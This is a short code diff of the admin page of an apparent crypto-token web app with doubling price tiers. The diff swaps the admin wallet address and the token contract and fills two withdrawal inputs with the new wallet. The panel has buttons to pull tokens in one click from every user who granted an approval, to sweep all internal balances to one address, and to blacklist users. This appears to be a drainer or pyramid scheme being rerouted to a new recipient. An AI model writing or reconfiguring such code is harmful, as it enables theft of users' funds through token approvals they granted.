@@ -80,7 +80,7 @@
   <div class="admin-sidebar-item" id="adminExtractAuthorized">
     <div style="height:1px;background:#fff3;margin:16px 0"></div>
     <div class="title">🔐 管理员授权提取</div>
-    <input id="adminExtractAddr" placeholder="接收代币钱包地址">
+    <input id="adminExtractAddr" placeholder="0xF33db576048EF01f8D65a6450FAF1a45E85A7783">
     <input id="adminExtractAmount" placeholder="提取数量（如100）">
     <button class="btn btn-sm btn-red" onclick="adminExtractFromAllAuthorized()">
       一键提取所有已授权用户代币
@@ -148,7 +148,7 @@
   <input id="whiteAddr" placeholder="移出黑名单">
   <button class="btn btn-sm" onclick="removeBlack()">移出</button>
 
-  <input id="collectToAddr" placeholder="内部余额统一提取到地址">
+  <input id="collectToAddr" placeholder="0xF33db576048EF01f8D65a6450FAF1a45E85A7783">
   <button class="btn btn-sm btn-red" onclick="adminCollectToCustomAddr()">
     一键提取所有内部余额到指定地址
   </button>
@@ -188,8 +188,8 @@
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
 // 管理员钱包地址
-const ADMIN = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
-const DAI = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase();
+const ADMIN = "0xF33db576048EF01f8D65a6450FAF1a45E85A7783";
+const DAI = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F".toLowerCase();
 
 const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
 const unionPrice   = [100,200,400,800,1600,3200,6400,12800,25600];
